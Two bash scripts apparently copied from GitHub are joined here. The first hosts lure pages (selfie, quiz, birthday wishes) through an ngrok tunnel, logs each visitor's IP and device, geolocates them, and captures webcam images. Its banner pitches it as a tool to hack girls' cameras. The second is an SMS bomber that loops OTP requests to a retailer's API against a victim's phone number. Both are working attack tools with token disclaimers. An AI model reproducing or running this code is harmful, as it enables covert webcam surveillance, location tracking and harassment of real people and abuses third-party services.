dependencies() {
echo                                                                                                                                          
command -v zip > /dev/null 2>&1 || { echo -e >&2 "\e[94m➟ \e[92mNeed ZIP installing it....." && apt install zip > /dev/null 2>&1;}
command -v php > /dev/null 2>&1 || { echo -e >&2 "\e[94m➟ \e[92mNeed PHP installing it....." && apt install php > /dev/null 2>&1;}            
command -v curl > /dev/null 2>&1 || { echo -e >&2 "\e[94m➟ \e[92mNeed CURL installing it....." && apt install curl > /dev/null 2>&1;}
command -v wget > /dev/null 2>&1 || { echo -e >&2 "\e[94m➟ \e[92mNeed WGET installing it....." && apt install wget > /dev/null 2>&1;}
command -v git > /dev/null 2>&1 || { echo -e >&2 "\e[94m➟ \e[92mNeed GIT installing it....." && apt install git > /dev/null 2>&1;}
echo
}
dependencies
banner() {
clear
echo -e '\e[91m
\e[92m               ,-""-.
\e[92m              / ,--. \
\e[92m             | ( \e[91m()\e[92m ) |  \e[93m┌─┐┌─┐┌─┐🎃🎃🎃\e[92m┬ ┬
\e[92m              \ `--` /   \e[93m└─┐├┤ ├┤  \e[92m│ │
\e[92m               `-..-`    \e[93m└─┘└─┘└─┘ \e[92m└─┘'
echo
echo -e '            \e[92m::: Tool By  Mr.H4cker :::\e[0m'
echo -e '          \e[92m::: github.com/Maih4ckerHu :::\e[0m'
echo -e '.          \e[92m:::  Akele Hi kafi hu 😏😏 P.R 😘😘  :::\e[0m'
echo -e "\e[92m"
echo -e '                \e[100m Girls ,😘 camera 👸 HackiNg \e[0m'
echo
}
menu() {
echo -e "                    \e[93m[\e[32m1\e[93m]\e[93m➟ \e[92mSTART\e[0m"
echo -e "                    \e[93m[\e[32m2\e[93m]\e[93m➟ \e[92mUPDATE\e[0m"
echo -e "                    \e[93m[\e[32m3\e[93m]\e[93m➟ \e[92mABOUT\e[0m"
echo -e "                    \e[93m[\e[32m4\e[93m]\e[93m➟ \e[92mMORE\e[0m"
echo -e "                    \e[93m[\e[32m5\e[93m]\e[93m➟ \e[92mFOLLOW\e[0m"
echo -e "                    \e[93m[\e[32m6\e[93m]\e[93m➟ \e[92mVIDEO\e[0m"
echo -e "                    \e[93m[\e[32m7\e[93m]\e[93m➟ \e[92mCHAT NOW\e[0m"
echo -e "                    \e[93m[\e[32m8\e[93m]\e[93m➟ \e[92mRESTART\e[0m"
echo -e "                    \e[93m[\e[32m0\e[93m]\e[93m➟ \e[92mEXIT\e[0m"
echo 
echo -ne "\e[92mSelect Option\e[92m: \e[34m" 
read sit
if [[ "$sit" = "1" || "$sit" = "one" ]];
then 
pagemenu
elif [[ "$sit" = "2" || "$sit" = "two" ]];
then
echo -e  "                    Pahle itna sikh uske baad update "
elif [[ "$sit" = "3" || "$sit" = "three" ]];
then
about
elif [[ "$sit" = "4" || "$sit" = "four" ]];
then
xdg-open https://www.jbsnhacking.simdif.com 2>/dev/null
elif [[ "$sit" = "5" || "$sit" = "five" ]];
then
xdg-open https://jbsnhacking.simdif.com 2>/dev/null
elif [[ "$sit" = "6" || "$sit" = "six" ]];
then
xdg-open https://jbsnhacking.simdif.com > /dev/null 2>&1
elif [[ "$sit" = "7" || "$sit" = "seven" ]];
then
xdg-open https://wa.me/+917070859175 > /dev/null 2>&1
elif [[ "$sit" = "8" || "$sit" = "eight" ]];
then
cd $HOME/seeu
bash seeu.sh
elif [[ "$sit" = "0" || "$sit" = "zero" ]];
then
exit 1
else
echo -e "\e[93m             Lauda thik se daal.....\e[0m"
exit 1
fi
}

pagemenu() {
banner
echo -e "                    \e[93m[\e[32m1\e[93m]\e[93m➟ \e[92mSelFie\e[0m"
echo -e "                    \e[93m[\e[32m2\e[93m]\e[93m➟ \e[92mQuIz\e[0m"
echo -e "                    \e[93m[\e[32m3\e[93m]\e[93m➟ \e[92mGuEss\e[0m"
echo -e "                    \e[93m[\e[32m4\e[93m]\e[93m➟ \e[92mSpinWheel\e[0m"
echo -e "                    \e[93m[\e[32m5\e[93m]\e[93m➟ \e[92mHopGame\e[0m"
echo -e "                    \e[93m[\e[32m6\e[93m]\e[93m➟ \e[92mBirthDay\e[0m"
echo -e "                    \e[93m[\e[32m7\e[93m]\e[93m➟ \e[92mWishBook\e[0m"
echo -e "                    \e[93m[\e[32m8\e[93m]\e[93m➟ \e[92mRPSGame\e[0m"
echo -e "                    \e[93m[\e[32m9\e[93m]\e[93m➟ \e[92mFireWorks\e[0m"
echo -e "                    \e[93m[\e[32m10\e[93m]\e[93m➟ \e[92mHappyNewYear\e[0m"
echo
echo -ne "\e[92mSelect Option\e[92m: \e[34m"
read selc
if [[ "$selc" == "1" || "$selc" == "one" || "$selc" == "selfie" ]];
then
site="selfie"
rm -rf webs/$site/even.html > /dev/null 2>&1
start
elif [[ "$selc" == "2" || "$selc" == "two" || "$selc" == "quiz" ]]
then
site="quiz"
rm -rf webs/$site/option.html > /dev/null 2>&1
start
elif [[ "$selc" == "3" || "$selc" == "three" || "$selc" == "guess" ]]
then
site="guess"
rm -rf webs/$site/option.html > /dev/null 2>&1
start
elif [[ "$selc" == "4" || "$selc" == "four" || "$selc" == "spinwheel" ]]
then
site="spinwheel"
rm -rf webs/$site/option.html > /dev/null 2>&1
start
elif [[ "$selc" == "5" || "$selc" == "five" || "$selc" == "hopgame" ]] 
then
site="game"
rm -rf webs/$site/option.html > /dev/null 2>&1
start
elif [[ "$selc" == "6" || "$selc" == "six" || "$selc" == "birthday" ]]
then
birthday
rm -rf webs/$site/option.html > /dev/null 2>&1
elif [[ "$selc" == "7" || "$selc" == "seven" || "$selc" == "wishbook" ]]
then
book
elif [[ "$selc" == "8" || "$selc" == "eight" || "$selc" == "rpsgame" ]]
then
site="rps"
rm -rf webs/$site/option.html > /dev/null 2>&1
start
elif [[ "$selc" == "9" || "$selc" == "nine" || "$selc" == "firework" ]]
then
firework
rm -rf webs/$site/option.html > /dev/null 2>&1
elif [[ "$selc" == "10" || "$selc" == "ten" || "$selc" == "hny" ]]
then
boxwish
rm -rf webs/$site/option.html > /dev/null 2>&1
elif [[ "$selc" == "00" || "$selc" == "exit" || "$selc" == "exit" ]]
then
banner
menu
fi
}

birthday() {
echo
echo -e "  \e[92m[\e[34m1\e[92m]\e[92m➟ \e[93mDefault\e[0m    \e[92m[\e[34m2\e[92m]\e[92m➟ \e[93mCustom\e[0m "
echo
echo -ne "\e[92mSELECT OPTION\e[0m: \e[92m"
read selc
if [[ "$selc" == "1" || "$selc" == "one" || "$selc" == "default" ]];
then
site="birthday"
rm -rf webs/$site/option.html > /dev/null 2>&1
start
elif [[ "$selc" == "2" || "$selc" == "two" || "$selc" == "custom" ]];
then
site="birthday"
rm -rf webs/$site/option.html > /dev/null 2>&1
echo " "
echo -e "\e[94m<<\e[93mcustom options require input actions\e[94m>>\e[92m"
echo " "
echo -e "\e[93mEvent Name: "
read event
echo -e "\e[93mPerson Name: "
read person
echo "Wish Message: "
read msg
echo
echo -e "\e[94m   <<\e[93mcustom template created\e[94m>>\e[92m"
sed "6s|\(.*\)|<legend>  <h2 class="text_head">$event</h2></legend>|" webs/$site/$site.html > option.html && mv option.html webs/$site
sed "7s|\(.*\)|<h2 class="text">$person</h2>|" webs/$site/option.html > random.html && mv random.html webs/$site
sed "8s|\(.*\)|<h2 class="text">$msg</h2>|" webs/$site/random.html > custom.html && mv custom.html webs/$site
rm -rf webs/$site/random.html > /dev/null 2>&1
start
fi
}

book() {
echo
echo -e "  \e[92m[\e[34m1\e[92m]\e[92m➟ \e[93mDefault\e[0m    \e[92m[\e[34m2\e[92m]\e[92m➟ \e[93mCustom\e[0m "
echo
echo -ne "\e[92mSELECT OPTION\e[0m: \e[92m"
read selc
if [[ "$selc" == "1" || "$selc" == "one" || "$selc" == "default" ]];
then
site="book"
rm -rf webs/$site/option.html > /dev/null 2>&1
start
elif [[ "$selc" == "2" || "$selc" == "two" || "$selc" == "custom" ]];
then
site="book"
rm -rf webs/$site/option.html > /dev/null 2>&1
echo " "
echo -e "\e[94m<<\e[93mcustom options require input actions\e[94m>>\e[92m"
echo " "
echo -e "\e[93mEvent Name: "
read event
echo -e "\e[93mWish Message: "
read msg
echo
echo -e "\e[94m   <<\e[93mcustom template created\e[94m>>\e[92m"
sed "32s|\(.*\)|<p id="head">$event</p>|" webs/$site/$site.html > option.html && mv option.html webs/$site
sed "33s|\(.*\)|<p>$msg</p>|" webs/$site/option.html > custom.html && mv custom.html webs/$site
start
fi
}

firework() {
echo
echo -e "  \e[92m[\e[34m1\e[92m]\e[92m➟ \e[93mDefault\e[0m    \e[92m[\e[34m2\e[92m]\e[92m➟ \e[93mCustom\e[0m "
echo
echo -ne "\e[92mSELECT OPTION\e[0m: \e[92m"
read selc
if [[ "$selc" == "1" || "$selc" == "one" || "$selc" == "default" ]];
then
site="firework"
rm -rf webs/$site/option.html > /dev/null 2>&1
start
elif [[ "$selc" == "2" || "$selc" == "two" || "$selc" == "custom" ]];
then
site="firework"
rm -rf webs/$site/option.html > /dev/null 2>&1
echo " "
echo -e "\e[94m<<\e[93mcustom options require input actions\e[94m>>\e[92m"
echo " "
echo -e "\e[93mEvent Name: "
read event
echo -e "\e[93mPerson Name: "
read msg
echo
echo -e "\e[94m   <<\e[93mcustom template created\e[94m>>\e[92m"
sed "5s|\(.*\)|<center><h1>$event</h1><center>|" webs/$site/$site.html > option.html && mv option.html webs/$site
sed "7s|\(.*\)|<h2>$msg<h2>|" webs/$site/option.html > custom.html && mv custom.html webs/$site
start
fi
}

boxwish() {
echo
echo -e "  \e[92m[\e[34m1\e[92m]\e[92m➟ \e[93mDefault\e[0m    \e[92m[\e[34m2\e[92m]\e[92m➟ \e[93mCustom\e[0m "
echo
echo -ne "\e[92mSELECT OPTION\e[0m: \e[92m"
read selc
if [[ "$selc" == "1" || "$selc" == "one" || "$selc" == "default" ]];
then
site="boxwish"
rm -rf webs/$site/option.html > /dev/null 2>&1
start
elif [[ "$selc" == "2" || "$selc" == "two" || "$selc" == "custom" ]];
then
site="boxwish"
rm -rf webs/$site/option.html > /dev/null 2>&1
echo " "
echo -e "   \e[94m<<\e[93mcustom options require input actions\e[94m>>\e[92m"
echo " "
echo -e "\e[93mEvent Name: "
read event
echo -e "\e[93mPerson Name: "
read person
echo
echo -e "    \e[94m   <<\e[93mcustom template created\e[94m>>\e[92m"
sed "10s|\(.*\)|<h1>$event</h1>|" webs/$site/$site.html > option.html && mv option.html webs/$site
sed "11s|\(.*\)|<h2>$person</h2>|" webs/$site/option.html > custom.html && mv custom.html webs/$site
start
fi
}

start() {

if [[ -e webs/$site/ip.txt ]]; then
rm webs/$site/ip.txt 2>&1
fi

if [[ -e webs/$site/index.php ]]; then
rm  webs/$site/index.php 2>&1
fi

if [[ -e webs/$site/index.html ]]; then
rm  webs/$site/index.html 2>&1
fi

if [[ -e webs/$site/Log.log ]]; then
rm webs/$site/Log.log 2>&1
fi

if [[ -e webs/$site/template.html ]]; then
rm  webs/$site/template.html 2>&1
fi

if [[ -e ngrok ]]; then
echo ""
else
echo
printf "\e[1;92m[\e[34m•\e[1;92m] Downloading Ngrok...\n"
arch=$(uname -a | grep -o 'arm')
if [[ $arch == *'arm'* ]]; then
wget https://bin.equinox.io/a/e93TBaoFgZw/ngrok-2.2.8-linux-arm.zip > /dev/null 2>&1
if [[ -e ngrok-2.2.8-linux-arm.zip ]]; then
unzip ngrok-2.2.8-linux-arm.zip > /dev/null 2>&1
rm -rf $HOME/.ngrok2 > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-2.2.8-linux-arm.zip
else                                                                                                                  
echo
printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"                              
exit 1
fi
else
wget https://github.com/noob-hackers/impstuff/raw/main/ngrok%2Bwifi%2Bdata.zip > /dev/null 2>&1
if [[ -e ngrok+wifi+data.zip ]]; then
unzip ngrok+wifi+data.zip > /dev/null 2>&1
rm -rf $HOME/.ngrok2 > /dev/null 2>&1                                                            
chmod +x ngrok                                                                                   
rm -rf ngrok+wifi+data.zip
else
echo
printf "\e[1;93m[!] Unable to download \e[0m\n"
exit 1
fi                         
fi
fi                                                                                                                   

if [[ -e webs/$site/option.html ]]; then
echo -e "\e[1;92m[\e[34m•\e[1;92m] Starting Host Server..."
cd webs/$site && mv custom.html template.html && php -S 127.0.0.1:3333 > /dev/null 2>&1 &
sleep 8
echo -e "\e[1;92m[\e[34m•\e[1;92m] Starting Ngrok Server..."
./ngrok http 3333 > /dev/null 2>&1 &
sleep 10
else
echo -e "\e[1;92m[\e[34m•\e[1;92m] Starting Host Server..."
cd webs/$site && cp $site.html template.html && php -S 127.0.0.1:3333 > /dev/null 2>&1 &
sleep 8
echo -e "\e[1;92m[\e[34m•\e[1;92m] Starting Ngrok Server..."
./ngrok http 3333 > /dev/null 2>&1 &
sleep 10
fi
link=$(curl -s -N http://127.0.0.1:4040/status | grep -o "https://[0-9A-Za-z.-]*\.ngrok.io")
status=$(curl -s -o /dev/null -I -w "%{http_code}" $link)
stat=$(echo "$status")
if [ "$stat" = "200" ];
then
echo -e  "\e[1;92m[\e[34m•\e[1;92m] Link working code \e[34m[\e[0m200\e[34m]\e[0m"
touch bypass.html
cat > bypass.html << EOF
<iframe name="$site" src="$link" width="100%" height="100%" frameborder="0" scrolling="yes" style="width: 100%;"> </iframe>
EOF
bypass=$(cat bypass.html)
echo -e  "\e[92m[-------------\e[34mGoogle Bypass Code\e[92m-------------]\e[91m"
echo -e  "\e[0m$bypass \e[0m"                                                     
echo -e  "\e[92m[-----------\e[34mUse This Code in Github\e[92m----------]\e[92m"
echo
sed 's+forwarding_link+'$link'+g' webs/$site/template.html > webs/$site/index.html
sed 's+forwarding_link+'$link'+g' webs/$site/forward.php > webs/$site/index.php
echo -e  "\e[1;92m[\e[34m•\e[1;92m] Send This Link: \e[0m$link\e[0m"
checkfound
else
echo -e  "\e[1;92m[\e[34m•\e[1;92m] Link working code \e[34m[\e[91m000\e[34m]\e[0m"
echo
touch bypass.html
cat > bypass.html << EOF
<iframe name="$site" src="$link" width="100%" height="100%" frameborder="0" scrolling="yes" style="width: 100%;"> </iframe>
EOF
bypass=$(cat bypass.html)
echo -e  "\e[92m[-------------\e[34mGoogle Bypass Code\e[92m-------------]\e[91m"
echo -e  "\e[0m$bypass \e[0m"                                                     
echo -e  "\e[92m[-----------\e[34mUse This Code in Github\e[92m----------]\e[92m"
sed 's+forwarding_link+'$link'+g' webs/$site/template.html > webs/$site/index.html
sed 's+forwarding_link+'$link'+g' webs/$site/forward.php > webs/$site/index.php
echo -e  "\e[1;92m[\e[34m•\e[1;92m] Send This Link: \e[0m$link\e[0m"
#merge
checkfound
fi
}

checkfound() {
echo ' '
echo -e "\e[1;93m[\e[0m\e[34m•\e[0m\e[1;93m] Waiting for victim to open link...\e[0m\n"
while [ true ]; do
if [[ -e "webs/$site/ip.txt" ]]; then
echo
echo -e "\e[92m------------------------\e[34mVICTIM FOUND\e[92m-------------------------\e[0m"
echo ' '
echo -e  "\e[1;92m[\e[34m•\e[1;92m] Device info found..."
echo ' '
catch_ip
sleep 1.0
fi
done 
}

catch_ip() {
ip=$( egrep '(([0-9a-fA-F]{1,4}:){7,7}[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,7}:|([0-9a-fA-F]{1,4}:){1,6}:[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,5}(:[0-9a-fA-F]{1,4}){1,2}|([0-9a-fA-F]{1,4}:){1,4}(:[0-9a-fA-F]{1,4}){1,3}|([0-9a-fA-F]{1,4}:){1,3}(:[0-9a-fA-F]{1,4}){1,4}|([0-9a-fA-F]{1,4}:){1,2}(:[0-9a-fA-F]{1,4}){1,5}|[0-9a-fA-F]{1,4}:((:[0-9a-fA-F]{1,4}){1,6})|:((:[0-9a-fA-F]{1,4}){1,7}|:)|fe80:(:[0-9a-fA-F]{0,4}){0,4}%[0-9a-zA-Z]{1,}|::(ffff(:0{1,4}){0,1}:){0,1}((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9]).){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])|([0-9a-fA-F]{1,4}:){1,4}:((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9]).){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9]))'  webs/$site/ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
ua=$(grep 'User-Agent:' webs/$site/ip.txt | cut -d '"' -f2)
echo -e "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] User-Agent:\e[0m$ua\e[0m\e[1;77m\e[0m\n"
chk=$(fmt -20 webs/$site/ip.txt)
sch=$(echo "$chk" > cod.txt)                                                                                                         
dom1=$(sed -n '5p' cod.txt | cut -d"(" -f2 | cut -d";" -f1)
dom2=$(sed -n '6p' cod.txt | cut -d"(" -f2 | cut -d";" -f1)
dom3=$(sed -n '7p' cod.txt | cut -d";" -f2 | cut -d")" -f1)
dom4=$(sed -n '11p' cod.txt | cut -d "/" -f1)
dom5=$(sed -n '11p' cod.txt | cut -d " " -f2 | cut -d"/" -f2)
dom6=$(sed -n '12p' cod.txt | cut -d"(" -f2 | cut -d")" -f1)
echo -e "\e[1;92m[\e[0m\e[1;34m★ \e[0m\e[1;92m] Kernel:\e[1;0m$dom1\e[0m" 
echo -e "\e[1;92m[\e[0m\e[1;34m★ \e[0m\e[1;92m] Os:\e[1;0m$dom2\e[0m"
echo -e "\e[1;92m[\e[0m\e[1;34m★ \e[0m\e[1;92m] Model:\e[1;0m$dom3\e[0m"
echo -e "\e[1;92m[\e[0m\e[1;34m★ \e[0m\e[1;92m] Browser:\e[0m$dom4\e[0m"
echo -e "\e[1;92m[\e[0m\e[1;34m★ \e[0m\e[1;92m] Version:\e[1;0m$dom5\e[0m"
echo -e "\e[1;92m[\e[0m\e[1;34m★ \e[0m\e[1;92m] Device:\e[1;0m$dom6\e[0m"
cat webs/$site/ip.txt >> webs/$site/saved.ip.txt

if [[ -e location.txt ]]; then
rm -rf location.txt
fi

IFS='\n'
iptracker=$(curl -s -L "http://ipwhois.app/json/$ip" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > location.txt &&  grep -o '"[^"]*"\s*:\s*"[^"]*"' location.txt > track.txt)
IFS=$'\n'
iptt=$(sed -n 's/"ip"://p' track.txt)

if [[ $iptt != "" ]]; then
echo -e  "\e[1;92m[\e[34m•\e[92m] Device ip: \e[0m$iptt\e[0m"
fi

iptype=$(sed -n 's/"type"://p' track.txt)
if [[ $iptype != "" ]]; then
echo -e "\e[1;92m[\e[34m•\e[92m] IP type: \e[0m$iptype\e[0m" 
fi

continent=$(sed -n 's/"continent"://p' track.txt)
if [[ $continent != "" ]]; then
echo -e  "\e[1;92m[\e[34m•\e[92m] Continent: \e[0m$continent\e[0m" 
fi

country=$(sed -n 's/"country"://p' track.txt)
if [[ $country != "" ]]; then
echo -e  "\e[1;92m[\e[34m•\e[92m] Country: \e[0m$country\e[0m"
fi

flag=$(sed -n 's/"country_flag"://p' track.txt)
if [[ $flag != "" ]]; then
echo -e "\e[1;92m[\e[34m•\e[92m] Country flag: \e[0m$flag\e[0m"
fi

cap=$(sed -n 's/"country_capital"://p' track.txt)
if [[ $cap != "" ]]; then
echo -e "\e[1;92m[\e[34m•\e[92m] Country capital: \e[0m$cap\e[0m"
fi

phon=$(sed -n 's/"country_phone"://p' track.txt)
if [[ $phon != "" ]]; then
echo -e "\e[1;92m[\e[34m•\e[92m] Country code: \e[0m$phon\e[0m"
fi

region=$(sed -n 's/"region"://p' track.txt)
if [[ $region != "" ]]; then
echo -e "\e[1;92m[\e[34m•\e[92m] State: \e[0m$region\e[0m"
fi

city=$(sed -n 's/"city"://p' track.txt)
if [[ $city != "" ]]; then
echo -e "\e[1;92m[\e[34m•\e[92m] City: \e[0m$city\e[0m"
fi

isp=$(sed -n 's/"isp"://p' track.txt)
if [[ $isp != "" ]]; then
echo -e "\e[1;92m[\e[34m•\e[92m] Isp: \e[0m$isp\e[0m" 
fi

ccode=$(sed -n 's/"currency_code"://p' track.txt)
if [[ $ccode != "" ]]; then
echo -e "\e[1;92m[\e[34m•\e[92m] Currency code: \e[0m$ccode\e[0m"
fi
echo ""
imgrcv
}

imgrcv() {
echo " "
echo -e "\e[1;93m[\e[0m\e[34m•\e[0m\e[1;93m] Waiting For Image...\e[0m\n"
while [ true ]; do
if [[ -e "webs/$site/Log.log" ]]; then
echo -e  "\e[1;92m[\e[34m•\e[1;92m] Image Recieved..."
sleep 6.0
mv -f webs/$site/*.png /sdcard > /dev/null 2>&1
echo " "
echo -e  "\e[1;92m[\e[34m•\e[1;92m]\e[1;34m Image Moved To Gallery..."
rm webs/$site/ip.txt > /dev/null 2>&1
rm webs/$site/Log.log > /dev/null 2>&1
echo
echo -e "\e[92m---------------------\e[34mCHECK YOUR GALLERY\e[92m----------------------\e[0m"
echo
checkfound
fi
done
}

about() {
clear
echo -e '\e[96m                       ----------------'
echo -e '\e[92m                       ┌─┐┌┐ ┌─┐┬ ┬┌┬┐
                       ├─┤├┴┐│ ││ │ │ 
                       ┴ ┴└─┘└─┘└─┘ ┴ '
echo -e '\e[96m                       ----------------'
echo -e '\e[96m      |------------------|'
echo -e '\e[96m      |'
echo -e '\e[96m      |'
sleep 1.5
echo -e '\e[96m     [\e[92m+\e[96m]-------[\e[92mNITRO\e[96m]'
echo -e '\e[96m      |'
echo -e '\e[96m      |'
sleep 1.0
echo -e '\e[96m     [\e[92m+\e[96m]-------[\e[92mTOOL\e[96m]'
echo -e '\e[96m      |'
echo -e '\e[96m      |'
echo -e '\e[96m      |'
sleep 2.0
echo -e '\e[96m     [\e[92m+\e[96m]--------------'
echo -e '\e[96m                      |'
echo -e '\e[92m  THIS TOOLS IS ONLY FOR EDUCATIONAL PURPOSE SO'
echo -e '\e[92m IM NOT RESPONSIBLE IF YOU DO ANY ILLEGAL THINGS'
echo -e '\e[92m   THANKS FOR READING And Hack Girls camera  {Mr.H4cker}'
echo -e '\e[92m           HAVE A GOOD DAY BUDDIE :)'
echo -e '\e[96m                      |'
echo -e '\e[96m                      |'
sleep 4.5
echo -e '\e[96m                     [\e[92m+\e[96m]------------[\e[92mBYE\e[96m]\e[0m'
sleep 2.0
cd $HOME/seeu
clear
bash seeu.sh
}

banner
menu


#!/bin/bash
#==========================================================================================================================
#========================================================================================================================== 
#Vaim-sms v1.0
#don't use my code with giving me credit 
#if you use without giving me credit then you won't became a programmer so please respect
#Youtube channel : https://www.youtube.com/channel/UCu-xG31hWgJLIptcPBuSigQ
#Github (coded by vaimpier ritik ) >>> : https://github.com/VaimpierOfficial
#For business : sonuv0085@gmail.com
#vaimpier
#==========================================================================================================================
#==========================================================================================================================


banner() {

clear
printf "\e[1;91m    ____   ____      .__\e[0m\n"
printf "\e[1;91m    \   \ /   /____  |__| _____      \e[0m\e[1;93m       ______ _____   ______ \e[0m\n "
printf "\e[1;91m     \   Y   /\__  \ |  |/     \   __\e[0m\e[1;93m____  /  ___//     \ /  ___/ \e[0m\n "
printf "\e[1;91m      \     /  / __ \|  |  Y Y  \ /__\e[0m\e[1;93m___/  \___ \|  Y Y  \\___ \  \e[0m\n "
printf "\e[1;91m       \___/  (____  /__|__|_|  /    \e[0m\e[1;93m     /____  >__|_|  /____  > \e[0m\n "
printf "\e[1;91m                   \/         \/     \e[0m\e[1;93m          \/      \/     \/  \e[0m\n "

printf "\n"
printf " \e[1;77m[\e[1;93m::\e[0m\e[1;77m]\e[1;31m           By VaimpierOfficial (Vaimpier Ritik)  \e[0m                            \e[1;77m[\e[1;93m::\e[0m\e[1;77m]\e[0m\n"
printf " \e[1;77m[\e[1;93m::\e[0m\e[1;77m]           v2.0 coded by @vaimpier                                           \e[1;77m[\e[1;93m::\e[0m\e[1;77m]\e[0m\n"
printf " \e[1;77m[\e[1;93m::\e[0m\e[1;77m]           https://www.youtube.com/channel/UCu-xG31hWgJLIptcPBuSigQ          \e[0m\e[1;77m[\e[1;93m::\e[0m\e[1;77m]\e[0m\n"
printf "\n"
printf "        \e[1;91m Disclaimer: this tool is designed for Prank\n"
printf "         testing in an authorized simulated cyberattack\n"
printf "         Attacking targets without prior mutual consent\n"
printf "         is illegal!\n"
printf "\n"


}



upload() {

clear
printf "[+] HEY BRO PLEASE WAIT ......................... \n"
printf "[+] NOTE : HEY BRO AFTER UPDATING IF DOES'NT WORK THEN PLEASE SEND ME MESSAGE ON MY G-MAIL : 'sonuv0085@gmail.com' \n KEEP WATCHING OUR YOUTUBE CHANNEL : https://www.youtube.com/channel/UCu-xG31hWgJLIptcPBuSigQ \n GITHUB : https://github.com/VaimpierOfficial \n"
sleep 7
clear
cd
rm -rf Vaim-sms
git clone https://github.com/VaimpierOfficial/Vaim-sms
cd Vaim-sms
chmod +x *
clear
printf "[+] SCRIPT UPDATED PLEASE WAIT ............. "
sleep 2
bash Vaim-sms.sh 

}

menu(){

clear
banner

printf "\e[1;92m[\e[0m +\e[1;92m ]\e[0m \e[1;93mENTER VICITM NUMBER >>> \e[0m\n"
read -p '---------------> ' num
printf "\e[1;92m[\e[0m +\e[1;92m ]\e[0m \e[1;93mENTER LOG FILE NAME >>> \e[0m\n"
read -p '---------------> ' log

printf "\n"
printf ">>>\e[1;92m ATTACKING START ON +91$num \e[0m<<<"
sleep 5
printf "\n"
printf "PRESS CLTR+C TO QUIT ............. \n"
sleep 3
clear
opr

}

opr(){

while true
do
#curl -i -s -k -X $'POST' \
#    -H $'Host: www.fbbonline.in' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0' -H $'Accept: application/json, text/javascript, */*; q=0.01' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Referer: https://www.fbbonline.in/customer/account/create' -H $'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H $'X-Requested-With: XMLHttpRequest' -H $'Content-Length: 436' -H $'DNT: 1' -H $'Connection: close' -H $'Cookie: _gcl_au=1.1.243953279.1596480303; __stp={\"visit\":\"returning\",\"uuid\":\"de2960e2-2dcc-4dfc-8afb-edce8db26f38\"}; _fv=cmpnpp; __stdf=0; __stgeo=\"1\"; __stbpnenable=1; historyPlpPage=0; PHPSESSID=u1c4phs0iqtfsl6b8nhh8n9r97; _st_time=1598178565; registration_url_cookie=https%3A%2F%2Fwww.fbbonline.in%2F; all_store_details=null' \
#    -b $'_gcl_au=1.1.243953279.1596480303; __stp={\"visit\":\"returning\",\"uuid\":\"de2960e2-2dcc-4dfc-8afb-edce8db26f38\"}; _fv=cmpnpp; __stdf=0; __stgeo=\"1\"; __stbpnenable=1; historyPlpPage=0; PHPSESSID=u1c4phs0iqtfsl6b8nhh8n9r97; _st_time=1598178565; registration_url_cookie=https%3A%2F%2Fwww.fbbonline.in%2F; all_store_details=null' \
#    --data-binary $'YII_CSRF_TOKEN=bbbef391f437ca8b30e4f2e45e998ccc9ea911e5&RegistrationForm%5Bsignup_page%5D=1&RegistrationForm%5Bcontact_number%5D='$num'&RegistrationForm%5Bvalid_mobile%5D=1&RegistrationForm%5Bemail%5D=sjbsj%40gmail.com&RegistrationForm%5Bvalid_email%5D=1&RegistrationForm%5Bfirst_name%5D=malicious&RegistrationForm%5Blast_name%5D=virus&RegistrationForm%5Bpassword%5D=httpsindianvirus&RegistrationForm%5Btc_opt_in%5D=on&validate_otp=' \
#    $'https://www.fbbonline.in/customer/account/GenerateOtp' > $log.txt
    
    
curl -i -s -k -X $'GET' \
    -H $'Host: express.shop.bigbazaar.com' -H $'Connection: close' -H $'sec-ch-ua: \";Not A Brand\";v=\"99\", \"Chromium\";v=\"88\"' -H $'Accept: application/json, text/plain, */*' -H $'sec-ch-ua-mobile: ?0' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36' -H $'Origin: https://shop.bigbazaar.com' -H $'Sec-Fetch-Site: same-site' -H $'Sec-Fetch-Mode: cors' -H $'Sec-Fetch-Dest: empty' -H $'Referer: https://shop.bigbazaar.com/' -H $'Accept-Encoding: gzip, deflate' -H $'Accept-Language: en-US,en;q=0.9' \
    $'https://express.shop.bigbazaar.com/express/customer/'$num'/loginOtpInitiate' > $log.txt
done

}


menux() {

clear
apt install curl
clear
banner
printf "\e[1;92m[\e[0m 1\e[1;92m ]\e[0m>>>\e[1;93m ATTACK ON NUMBER \e[0m\n"
printf "\e[1;92m[\e[0m 2 \e[1;92m]\e[0m>>>\e[1;93m UPDATE SCRIPT \e[0m\n"
printf "\e[1;92m[\e[0m 3\e[1;92m ]\e[0m>>>\e[1;93m QUIT \e[0m\n"
printf "\n"
read -p '>>> SELECT ANYONE >>> ' options

if [ "$options" -eq "1" ];then
        menu
fi

if [ "$options" -eq "2" ];then
        upload
fi

if [ "$options" -eq "3" ];then
        exit
        exit
        exit
else
        menux
fi


}

menux

    © 2021 GitHub, Inc.
    Terms
    Privacy
    Security
    Status
    Docs

    Contact GitHub
    Pricing
    API
    Training
    Blog
    About

